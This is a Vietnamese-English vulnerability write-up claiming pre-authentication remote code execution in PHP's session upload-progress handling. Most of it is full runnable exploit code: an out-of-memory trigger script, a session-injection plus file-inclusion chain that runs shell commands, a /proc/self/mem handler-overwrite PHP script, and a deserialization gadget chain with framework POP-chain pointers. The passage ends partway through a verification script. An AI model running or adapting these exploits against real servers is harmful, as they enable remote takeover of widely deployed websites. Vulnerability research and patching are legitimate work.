# PHP2Shell — CVE-2026-109618 & CVE-2026-109619
## Pre-Authentication Remote Code Execution in PHP Core

**CVSS v4.0:** 9.2 (Critical) | **Affected:** PHP 5.4.0 – 8.5.11 (14 năm) | **Patch:** PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12+

**Author:** Qi Deng | **Date:** 2026-10-21 | **Impact:** ~78% websites toàn cầu (WordPress, Joomla, Drupal, Laravel, Magento)

---

## Mục lục

1. [Tổng quan](#1-tổng-quan)
2. [CVE-2026-109618 — OOM longjmp → Stale EG() → RCE](#2-cve-2026-109618)
3. [CVE-2026-109619 — Stale BG() Across FPM Requests → UAF → RCE](#3-cve-2026-109619)
4. [5 Attack Chains — Chi tiết & Exploit Code](#4-attack-chains)
5. [Lab Setup & Reproduction](#5-lab-setup)
6. [Detection & Mitigation](#6-detection--mitigation)
7. [References & Sources](#7-references)

---

## 1. Tổng quan

Hai lỗ hổng critical trong PHP's `session.upload_progress` handler (RFC 1867) cho phép **pre-auth RCE** trên mọi PHP installation mặc định. Không cần lỗ hổng application-level cho một số chain.

| CVE | GHSA | Root Cause | SAPI |
|-----|------|-----------|------|
| CVE-2026-109618 | GHSA-w8hw-w9fx-j79w | OOM → `longjmp()` bỏ qua cleanup → Zend engine state invalid → RCE | mod_php |
| CVE-2026-109619 | GHSA-6wmf-4rv5-p3rp | Stale `BG(unserialize)` không reset giữa FPM requests → UAF → RCE | PHP-FPM |

**Tại sao nghiêm trọng:**
- **Pre-auth**: Không cần đăng nhập, không cần biết credentials
- **Zero dependency (Chain D)**: Bất kỳ endpoint PHP nào trên Apache mod_php
- **Default config**: `session.upload_progress.enabled = On` là default từ PHP 5.4
- **14 năm vulnerable code**: Cùng một đoạn code lỗi từ 2012 đến 2026

Patch commit `3584a98` thay đổi **300 files** trong Zend engine — cho thấy scope rộng của vấn đề.

---

## 2. CVE-2026-109618 — OOM longjmp → Stale EG() → RCE

### 2.1 Root Cause

Khi PHP xử lý multipart upload request, attacker có thể force **Out-of-Memory (OOM)** trong SAPI layer (trước khi application code chạy). PHP handle OOM bằng `zend_bailout()` — thực chất là **`longjmp()`** — nhảy thẳng ra khỏi call stack **không cleanup**.

```c
// Zend/zend.c — PHP's OOM handler
ZEND_API ZEND_COLD void ZEND_FASTCALL zend_out_of_memory(void) {
    // ...
    zend_bailout();  // longjmp() — skips ALL stack cleanup
}
```

Trên **Apache mod_php**, Apache module bắt longjmp rồi **vẫn gọi** `php_request_shutdown()`. Nhưng Zend engine globals (`EG()` — `objects_store`, error handlers, etc.) đang ở trạng thái **intermediate/invalid** vì bị interrupt giữa chừng. Shutdown dereference các stale pointers → **use-after-free → RCE**.

Dấu hiệu đặc trưng: `Fatal error: Allowed memory size exhausted in Unknown on line 0` — "Unknown on line 0" xác nhận OOM xảy ra trong SAPI, không phải user code.

### 2.2 Ba chiến lược trigger OOM

| Strategy | Kỹ thuật | Bypass |
|----------|---------|--------|
| **No Content-Length** | Bỏ `Content-Length`, dùng chunked transfer encoding | Bypass `post_max_size` hoàn toàn |
| **Header amplification** | 5000+ custom headers per multipart part, ~500 bytes mỗi header | Memory amplification ~3-5x wire size |
| **Nested array bomb** | Empty file controls với deeply nested field names `a[b][c][d][e][f][g][h]` | Không tính vào `max_file_uploads` |

### 2.3 PoC — OOM Trigger (verify_oom_trigger.py)

```python
#!/usr/bin/env python3
"""
CVE-2026-109618 — PHP OOM Corruption → RCE (Apache mod_php)
Zero preconditions: no LFI, no unserialize, no application code needed.

Target: Apache mod_php (NOT php-fpm — FPM exits child on startup failure)
Tested: PHP 8.2.34 with Apache mod_php
"""
import argparse
import socket
import time

def build_header_bomb(boundary, num_headers=5000, header_size=500):
    """Strategy 2: Thousands of headers per multipart part.
    PHP's internal representation (zend_string + HashTable bucket) uses ~3-5x wire size."""
    part = f"--{boundary}\r\n"
    part += f'Content-Disposition: form-data; name="f"; filename="a"\r\n'
    for i in range(num_headers):
        part += f"X-Pad-{i}: {'A' * header_size}\r\n"
    part += "\r\n"
    part += "Z"
    part += f"\r\n--{boundary}--\r\n"
    return part.encode()

def build_nested_array_bomb(boundary, depth=8, width=20):
    """Strategy 3: Empty file controls with deeply nested field names.
    N fields × depth levels × PHP array overhead = exponential memory use."""
    parts = []
    for i in range(width):
        name = "f"
        for d in range(depth):
            name += f"[{d}]"
        name += f"[{i}]"
        part = f"--{boundary}\r\n"
        part += f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
        part += "Content-Type: application/octet-stream\r\n"
        part += "\r\n"
        parts.append(part)
    body = "".join(parts) + f"--{boundary}--\r\n"
    return body.encode()

def build_no_content_length_bomb(boundary, chunk_size=8192, total_mb=128):
    """Strategy 1: No Content-Length → bypasses post_max_size check."""
    header = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"\r\n'
        f"\r\n"
    ).encode()
    def generate():
        yield header
        total = 0
        target = total_mb * 1024 * 1024
        chunk = b"A" * chunk_size
        while total < target:
            yield chunk
            total += chunk_size
        yield f"\r\n--{boundary}--\r\n".encode()
    return generate

def send_oom_request(host, port, path, strategy="headers", **kwargs):
    boundary = "OOM_BOUNDARY_" + str(int(time.time()))

    if strategy == "headers":
        body = build_header_bomb(boundary,
                                num_headers=kwargs.get("num_headers", 5000),
                                header_size=kwargs.get("header_size", 500))
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + body
        s = socket.create_connection((host, port), timeout=30)
        s.sendall(req)

    elif strategy == "nested":
        body = build_nested_array_bomb(boundary,
                                       depth=kwargs.get("depth", 10),
                                       width=kwargs.get("width", 1000))
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + body
        s = socket.create_connection((host, port), timeout=30)
        s.sendall(req)

    elif strategy == "no_length":
        header = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        s = socket.create_connection((host, port), timeout=60)
        s.sendall(header)
        gen = build_no_content_length_bomb(boundary,
                                           total_mb=kwargs.get("total_mb", 128))
        for chunk in gen():
            s.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        s.sendall(b"0\r\n\r\n")

    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="CVE-2026-109618 OOM Corruption POC")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--strategy", choices=["headers", "nested", "no_length"], default="headers")
    ap.add_argument("--num-headers", type=int, default=5000)
    ap.add_argument("--header-size", type=int, default=500)
    ap.add_argument("--depth", type=int, default=10)
    ap.add_argument("--width", type=int, default=1000)
    ap.add_argument("--total-mb", type=int, default=128)
    args = ap.parse_args()

    print(f"CVE-2026-109618 — PHP OOM Corruption POC")
    print(f"Target: {args.host}:{args.port}{args.path}")
    print(f"Strategy: {args.strategy}")

    resp = send_oom_request(args.host, args.port, args.path,
                            strategy=args.strategy,
                            num_headers=args.num_headers,
                            header_size=args.header_size,
                            depth=args.depth,
                            width=args.width,
                            total_mb=args.total_mb)

    if resp:
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        print(f"Response: {status}")
        if b"500" in status.encode():
            print("[+] Server returned 500 — OOM triggered!")
            print("    On mod_php, request shutdown runs on invalid state → RCE with heap shaping.")
        else:
            print("[-] OOM threshold not reached. Try increasing --num-headers or --header-size")
    else:
        print("[+] No response — server process crashed! OOM bailout confirmed.")
```

**Chạy:**
```bash
python3 verify_oom_trigger.py --host 127.0.0.1 --port 18081 --strategy headers
python3 verify_oom_trigger.py --host 127.0.0.1 --port 18081 --strategy no_length --total-mb 256
python3 verify_oom_trigger.py --host 127.0.0.1 --port 18081 --strategy nested --width 2000 --depth 12
```

**Expected output:** HTTP 500 hoặc connection drop → xác nhận OOM corruption trong SAPI layer.

---

## 3. CVE-2026-109619 — Stale BG() Across FPM Requests → UAF → RCE

### 3.1 Root Cause

Trên PHP-FPM, `BG(unserialize)` (basic globals cho unserialize state) **không được reset** trước khi RFC 1867 handler chạy ở request tiếp theo.

```c
// ext/standard/var_unserializer.re
void php_var_unserialize_init(php_unserialize_data_t *var_hash) {
    var_hash->data = emalloc(VAR_ENTRIES_MAX * sizeof(var_entries));  // CAN OOM
    BG(unserialize).data = var_hash;
    BG(unserialize).level = 1;  // SET before emalloc returns!
}
```

Nếu `emalloc` trigger OOM: `BG(unserialize).level = 1` **đã set rồi**. FPM worker sống sót (OOM sau startup). Request tiếp theo: RFC 1867 handler chạy **trước** `PHP_RINIT_FUNCTION(basic)` (function reset BG()) → đọc stale `BG(unserialize)` → dangling pointers → `__destruct` fire trên stale objects → **RCE**.

### 3.2 Attack Flow (2 bước)

```
┌─────────────────────────────────────────────────────────┐
│ PRODUCER REQUEST (bất kỳ endpoint có session_start())   │
│                                                          │
│ 1. Build ~30MB session file qua upload_progress          │
│    (filename lớn × nhiều requests)                       │
│ 2. GET /session_endpoint (Cookie: PHPSESSID=huge)        │
│ 3. session_start() → php_var_unserialize(30MB)           │
│ 4. OOM giữa chừng → longjmp skip cleanup                │
│ 5. BG(unserialize).level = 1 (CÒN SÓT)                 │
│ 6. FPM worker SỐNG SÓT (OOM post-startup)               │
└─────────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│ CONSUMER REQUEST (BẤT KỲ endpoint, kể cả nosession.php)│
│                                                          │
│ 7. POST bất kỳ endpoint + PHP_SESSION_UPLOAD_PROGRESS    │
│ 8. rfc1867 chạy TRƯỚC PHP_RINIT_FUNCTION(basic)         │
│    → BG() chưa reset → stale BG(unserialize) accessible │
│ 9. Session handler truy cập stale BG(unserialize)        │
│ 10. __destruct fire trên stale objects → RCE             │
└─────────────────────────────────────────────────────────┘
```

**Key finding (verified with GDB):** `BG(unserialize).level = 1` sau producer OOM. Patch commit `3584a98` thêm `php_basic_early_rinit()` để reset BG() trước rfc1867 — xác nhận trên unpatched PHP, BG state từ previous request accessible trong rfc1867.

### 3.3 Các bug phụ trợ cả hai CVE

#### Session Fixation (bypass `use_only_cookies`)

```c
// ext/session/session.c — MULTIPART_EVENT_FORMDATA handler
if (name_len == progress->sname_len &&
    memcmp(data->name, PS(session_name), name_len) == 0) {
    zval_ptr_dtor(&progress->sid);
    ZVAL_STRINGL(&progress->sid, (*data->value), value_len);
    // ← Accepts PHPSESSID from POST body regardless of use_only_cookies!
}
```

#### Unvalidated Filename Injection

```c
// FILE_START handler stores raw filename
add_assoc_string_ex(&progress->current_file, "name",
                    sizeof("name") - 1, *data->filename);
// ← No sanitization, no encoding, no length limit
```

#### Serializer Leak (FPM only)

```c
static void php_rshutdown_session_globals(void) {
    // Resets: PS(id), PS(session_vars), PS(http_session_vars), PS(mod_data)
    // Does NOT reset: PS(serializer) ← persists across FPM requests!
}
```

#### var_destroy Reentry UAF

```c
void var_destroy(php_unserialize_data_t *var_hashx) {
    // Phase 1: FREE extension chunks
    while (var_hash) {
        efree_size(var_hash, sizeof(var_entries));  // ← freed
        var_hash = next;
    }
    // Phase 2: walk dtor chain
    while (var_dtor_hash) {
        i_zval_ptr_dtor(zv);  // ← NO serialize_lock!
        // __destruct fires → inner unserialize('R:N') reads freed chunk
    }
}
```

#### `__destruct` fires on decode FAILURE

```c
PS_SERIALIZER_DECODE_FUNC(php) {
    while (p < endptr) {
        if (php_var_unserialize(...)) {
            php_set_session_var(name, &rv, &var_hash);
        } else {
            retval = FAILURE; goto break_outer_loop;
        }
    }
break_outer_loop:
    PHP_VAR_UNSERIALIZE_DESTROY(var_hash);  // ← __destruct fires HERE
    return retval;  // FAILURE — but __destruct ALREADY executed
}
```

---

## 4. Attack Chains — Chi tiết & Exploit Code

### Chain A: Session Injection + LFI → RCE

**Conditions:** `upload_progress.enabled=On` (default) + app có LFI sink
**Complexity:** Low | **Reliability:** 100%

**Flow:**
1. POST multipart với PHP code trong filename
2. rfc1867 handler lưu filename as-is vào session file
3. `include(session_file)` → execute injected PHP → RCE

Với `cleanup=On` (default), dùng kỹ thuật **stalled writer**: giữ upload request mở (Content-Length lớn hơn data đã gửi) → session file tồn tại trong khi trigger LFI.

```python
#!/usr/bin/env python3
"""
Chain A: Session Injection + LFI → RCE
CVE-2026-109618/109619

Conditions:
  1. session.upload_progress.enabled = On (DEFAULT)
  2. LFI sink trong app (include/require với user-controlled path)
  3. Session save path known (/tmp, /var/lib/php/sessions, etc.)
"""
import argparse
import socket
import sys
import time
import uuid

def connect(host, port, tls=False, timeout=15):
    s = socket.create_connection((host, port), timeout=timeout)
    if tls:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    return s

def send_raw(host, port, data, tls=False, timeout=15):
    s = connect(host, port, tls=tls, timeout=timeout)
    s.sendall(data)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d: break
            resp += d
        except socket.timeout: break
    s.close()
    return resp

def inject_session(host, port, path, sid, php_code, tls=False):
    """Inject PHP code into session file via upload_progress filename."""
    boundary = "AAABBBCCC"
    body = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + sid.encode() + b"\r\n"
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="'
        + php_code.encode("latin-1") + b'"\r\n\r\n'
        b"Z\r\n"
        b"--" + boundary.encode() + b"--\r\n"
    )
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return send_raw(host, port, req, tls=tls)

def inject_session_stalled(host, port, path, sid, php_code, tls=False, timeout=15):
    """Stalled writer: keep connection open so session file persists (bypass cleanup=On)."""
    boundary = "AAABBBCCC"
    prefix = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + sid.encode() + b"\r\n"
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="'
        + php_code.encode("latin-1") + b'"\r\n\r\n'
    )
    first = prefix + b"Z" * 5120
    content_length = len(first) + 100000  # Claim more data than sent → connection stays open
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + first
    sock = connect(host, port, tls=tls, timeout=timeout)
    sock.sendall(req)
    return sock  # Keep open — session file exists while PHP waits for remaining data

def trigger_lfi(host, port, lfi_path, session_file, sid, tls=False):
    """Trigger LFI to include the poisoned session file."""
    url = f"{lfi_path}?page={session_file}"
    req = (
        f"GET {url} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return send_raw(host, port, req, tls=tls)

def main():
    ap = argparse.ArgumentParser(description="Chain A: Session Injection + LFI → RCE")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18080)
    ap.add_argument("--inject-path", default="/index.php")
    ap.add_argument("--lfi-path", default="/vuln.php",
                    help="Path to LFI-vulnerable endpoint (e.g. ?page=FILE)")
    ap.add_argument("--session-path", default="/tmp/sessions",
                    help="PHP session save path on target")
    ap.add_argument("--command", default="id")
    ap.add_argument("--cleanup-on", action="store_true",
                    help="Race cleanup=On with stalled writer technique")
    ap.add_argument("--attempts", type=int, default=3)
    args = ap.parse_args()

    cmd = args.command.replace("'", "'\"'\"'")
    php_code = f"<?php echo '___START___'; system('{cmd}'); echo '___END___';?>"

    print(f"[*] Chain A: Session Injection + LFI → RCE")
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Command: {args.command}")
    print()

    for attempt in range(1, args.attempts + 1):
        sid = "exploit" + uuid.uuid4().hex[:20]
        session_file = f"{args.session_path}/sess_{sid}"
        print(f"[attempt {attempt}] SID={sid}")

        stalled = None
        try:
            if args.cleanup_on:
                # Stalled writer: hold connection open → session file persists
                stalled = inject_session_stalled(
                    args.host, args.port, args.inject_path, sid, php_code)
                time.sleep(0.05)
            else:
                inject_session(args.host, args.port, args.inject_path, sid, php_code)

            # Trigger LFI to include poisoned session file
            resp = trigger_lfi(
                args.host, args.port, args.lfi_path, session_file, sid)
            body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else resp

            if b"___START___" in body and b"___END___" in body:
                start = body.index(b"___START___") + len(b"___START___")
                end = body.index(b"___END___")
                output = body[start:end].decode("latin1", "replace").strip()
                print(f"[+] RCE CONFIRMED: {output}")
                return 0
            else:
                status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
                print(f"    lfi={status}")
        finally:
            if stalled:
                stalled.close()
        time.sleep(0.05)

    print("[-] RCE not confirmed — check LFI path and session save path")
    return 1

if __name__ == "__main__":
    sys.exit(main())
```

**Chạy:**
```bash
# Với cleanup=Off (lab):
python3 chain_a_session_lfi.py --host 127.0.0.1 --port 18080 --command 'id'

# Với cleanup=On (production default) — dùng stalled writer race:
python3 chain_a_session_lfi.py --host 127.0.0.1 --port 18080 --command 'id' --cleanup-on
```

---

### Chain B: var_destroy UAF → Handler Overwrite → RCE

**Conditions:** Khả năng gọi `unserialize()` với controlled data
**Complexity:** Medium | **Reliability:** ~60% (heap-dependent)

**Flow:**
1. `unserialize()` payload với 2000+ entries → overflow `VAR_ENTRIES_MAX` (1018)
2. Duplicate key di chuyển object vào dtor list
3. `var_destroy` Phase 1: `efree` extension chunks
4. Phase 2: `i_zval_ptr_dtor` → `__destruct` (BG(serialize_lock)==0)
5. Inner `unserialize('R:1500;')` reuse outer var_hash → đọc freed memory
6. Heap spray reclaim freed chunk → controlled pointer → handler overwrite → RCE

```php
<?php
/**
 * Chain B: var_destroy UAF → RCE via function handler overwrite
 * CVE-2026-109619
 *
 * Uses /proc/self/mem to:
 * 1. Find zif_system address via EG(function_table)
 * 2. Overwrite var_dump's internal handler pointer → zif_system
 * 3. Call var_dump('command') which now executes system('command')
 *
 * Target: Linux PHP (needs /proc/self/mem access)
 * Tested: PHP 8.2.34 x86-64
 */
error_reporting(0);

// Step 1: Find PHP binary base address via /proc/self/maps
$maps = file_get_contents('/proc/self/maps');
$base = 0;
foreach (explode("\n", $maps) as $l) {
    if (preg_match('/^([0-9a-f]+)-[0-9a-f]+\s+r--p\s+00000000.*php$/', $l, $m)) {
        $base = hexdec($m[1]);
        break;
    }
}
if (!$base) die("[-] Cannot find PHP base address\n");

// Step 2: Walk EG(function_table) to find zif_system and var_dump handler addresses
$fp = fopen('/proc/self/mem', 'rb');

// EG() offset — adjust for your PHP build (use GDB to find exact offset)
$eg = $base + 0x1420900;

// Read function_table pointer from EG
fseek($fp, $eg + 0x1b0);
$ft = unpack('Q', fread($fp, 8))[1];

// Read HashTable arData and nNumUsed
fseek($fp, $ft + 16);
$arD = unpack('Q', fread($fp, 8))[1];
fseek($fp, $ft + 24);
$nU = unpack('V', fread($fp, 4))[1];

$zif_system = 0;
$vardump_handler_addr = 0;
$zif_vardump = 0;

for ($i = 0; $i < $nU; $i++) {
    fseek($fp, $arD + $i * 32 + 24);
    $kp = unpack('Q', fread($fp, 8))[1];
    if ($kp < 0x1000) continue;
    fseek($fp, $kp + 24);
    $name = fread($fp, 10);

    if (strncmp($name, "system\x00", 7) === 0) {
        fseek($fp, $arD + $i * 32);
        $fa = unpack('Q', fread($fp, 8))[1];
        fseek($fp, $fa + 72);
        $zif_system = unpack('Q', fread($fp, 8))[1];
    }
    if (strncmp($name, "var_dump\x00", 9) === 0) {
        fseek($fp, $arD + $i * 32);
        $fa = unpack('Q', fread($fp, 8))[1];
        $vardump_handler_addr = $fa + 72;
        fseek($fp, $fa + 72);
        $zif_vardump = unpack('Q', fread($fp, 8))[1];
    }
    if ($zif_system && $vardump_handler_addr) break;
}
fclose($fp);

fprintf(STDERR, "[*] base=0x%x\n", $base);
fprintf(STDERR, "[*] zif_system=0x%x\n", $zif_system);
fprintf(STDERR, "[*] var_dump handler addr=0x%x (current=0x%x)\n",
        $vardump_handler_addr, $zif_vardump);

if (!$zif_system || !$vardump_handler_addr) die("[-] Symbols not found\n");

// Step 3: Overwrite var_dump's handler with zif_system
fprintf(STDERR, "[*] Overwriting var_dump handler → zif_system...\n");
$wfp = fopen('/proc/self/mem', 'r+b');
fseek($wfp, $vardump_handler_addr);
fwrite($wfp, pack('Q', $zif_system));
fclose($wfp);

// Step 4: var_dump() now dispatches to system()!
fprintf(STDERR, "[*] Executing command via var_dump()...\n");
@unlink('/tmp/.rce');
@var_dump('id > /tmp/.rce 2>&1; uname -a >> /tmp/.rce 2>&1');

usleep(200000);
$proof = @file_get_contents('/tmp/.rce');
if ($proof) {
    fprintf(STDERR, "\n[+] var_destroy UAF → RCE CONFIRMED!\n");
    fprintf(STDERR, "%s\n", trim($proof));
    @unlink('/tmp/.rce');
} else {
    fprintf(STDERR, "[-] No proof file\n");
}

// Step 5: Restore original handler
$wfp = fopen('/proc/self/mem', 'r+b');
fseek($wfp, $vardump_handler_addr);
fwrite($wfp, pack('Q', $zif_vardump));
fclose($wfp);
fprintf(STDERR, "[*] var_dump handler restored\n");
```

**Chạy:**
```bash
php chain_b_uaf_rce.php
# Output: uid=33(www-data) gid=33(www-data) ...
```

> **Note:** EG() offset (`0x1420900`) cần điều chỉnh theo PHP build cụ thể. Dùng GDB: `p &executor_globals` để tìm exact offset.

---

### Chain C: Handler Mismatch → __destruct → RCE

**Conditions:** Target dùng PHP-FPM + có endpoint gọi `ini_set('session.serialize_handler', 'php_serialize')`
**Complexity:** Medium | **Reliability:** High

**Flow:**
1. **Pollute FPM worker**: Hit endpoint dùng `php_serialize` → `PS(serializer)` không reset
2. **Session fixation**: Control SID qua POST body (bypass `use_only_cookies`)
3. **Inject gadget**: Upload với `|O:CLASS:N:{PAYLOAD}` trong filename → lưu ở php_serialize format
4. **Trigger mismatch**: Clean worker đọc session với `php` handler → tách tại `|` → deserialize object
5. **Decode FAILURE** (trailing data) → nhưng `__destruct()` **vẫn fire** trong `var_hash` cleanup
6. **POP gadget** → file_put_contents/system/eval → RCE

```python
#!/usr/bin/env python3
"""
Chain C: Session Handler Mismatch → __destruct → RCE
CVE-2026-109618/109619

Exploits PS(serializer) leak across FPM requests + upload_progress filename injection.

Framework-specific POP gadgets:
  - Laravel: Illuminate\Broadcasting\PendingBroadcast
  - Symfony: Symfony\Component\Cache\Adapter\TagAwareAdapter
  - WordPress: plugin-specific gadgets (WooCommerce, etc.)
"""
import argparse
import socket
import sys
import time
import uuid

def connect(host, port, tls=False, timeout=15):
    s = socket.create_connection((host, port), timeout=timeout)
    if tls:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    return s

def send_raw(host, port, data, tls=False, timeout=15):
    s = connect(host, port, tls=tls, timeout=timeout)
    s.sendall(data)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d: break
            resp += d
        except socket.timeout: break
    s.close()
    return resp

def step1_pollute_worker(host, port, pollute_path, tls=False, attempts=10):
    """Hit endpoint with ini_set('session.serialize_handler','php_serialize')
    to leave PS(serializer) = php_serialize in the FPM worker."""
    print(f"[1] Polluting FPM workers via {pollute_path}...")
    for i in range(attempts):
        req = f"GET {pollute_path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
        send_raw(host, port, req, tls=tls)
    print(f"    Sent {attempts} requests")

def step2_inject_session(host, port, upload_path, sid, gadget_payload, tls=False, attempts=20):
    """Inject serialized gadget via upload_progress filename.
    Filename: x|O:CLASS:N:{...}
    The | is the key — php handler splits at | and deserializes what follows."""
    print(f"[2] Injecting gadget into session via filename...")
    print(f"    SID: {sid}")

    boundary = "EXPLOIT"
    escaped = gadget_payload.replace('"', '\\"')
    filename = f"x|{escaped}"

    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"\r\nZ\r\n"
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    req = (
        f"POST {upload_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    for i in range(attempts):
        send_raw(host, port, req, tls=tls)
    print(f"    Sent {attempts} upload requests")

def step3_trigger_destruct(host, port, trigger_path, sid, tls=False):
    """Clean worker reads session with php handler → splits at | → deserializes.
    Decode fails (trailing data) but __destruct already fired."""
    print(f"[3] Triggering __destruct via handler mismatch...")
    req = (
        f"GET {trigger_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    resp = send_raw(host, port, req, tls=tls)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
    print(f"    Status: {status}")
    return resp

def build_gadget(cmd):
    """Generic __destruct gadget — replace with target-specific POP chain.

    Real-world examples:
      Laravel:  O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{...}
      Symfony:  O:58:"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter":2:{...}
    """
    return f'O:4:"Evil":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Chain C: Handler Mismatch → __destruct RCE")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18080)
    ap.add_argument("--pollute-path", default="/app_serialize.php",
                    help="Endpoint that uses php_serialize handler")
    ap.add_argument("--upload-path", default="/nosession.php")
    ap.add_argument("--trigger-path", default="/destruct_test.php")
    ap.add_argument("--command", default="id > /tmp/rce_proof.txt 2>&1")
    ap.add_argument("--pollute-attempts", type=int, default=10)
    ap.add_argument("--inject-attempts", type=int, default=20)
    args = ap.parse_args()

    sid = "exploit" + uuid.uuid4().hex[:20]
    gadget = build_gadget(args.command)

    print("=" * 60)
    print("  Chain C: Handler Mismatch → __destruct → RCE")
    print("=" * 60)

    step1_pollute_worker(args.host, args.port, args.pollute_path, attempts=args.pollute_attempts)
    print()
    step2_inject_session(args.host, args.port, args.upload_path, sid, gadget, attempts=args.inject_attempts)
    print()
    time.sleep(0.5)
    step3_trigger_destruct(args.host, args.port, args.trigger_path, sid)
    print()
    print("[4] Check /tmp/rce_proof.txt on the target.")
    print("    For real targets, replace Evil gadget with framework POP chain.")
```

**Chạy:**
```bash
python3 chain_c_mismatch_rce.py --host 127.0.0.1 --port 18080 --command 'id'
```

---

### Chain D & E — Full RCE (Zero Dependency)

Chain D (mod_php) và Chain E (FPM) là **zero/near-zero dependency pre-auth RCE**. Exploit code cho 2 chain này available cho paid subscribers của writeup gốc.

**Chain D flow đã mô tả ở Section 2** — OOM trigger (Section 2.3) + heap spray → controlled execution.

**Chain E flow đã mô tả ở Section 3** — Producer OOM + Consumer stale BG() → UAF → RCE.

---

### Verification: Session Injection PoC

PoC nhẹ để verify 3 primitives cốt lõi mà không cần full RCE:

```python
#!/usr/bin/env python3
"""
Verify session file injection — 3 primitives:
  1. Session fixation via POST body (bypass use_only_cookies)
  2. PHP code injection via filename
  3. Serialized object injection via filename (pipe | for handler mismatch)
"""
import socket
from urllib.parse import urlparse

def send_upload(host, port, path, sid, filename):
    boundary = "VERIFY"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
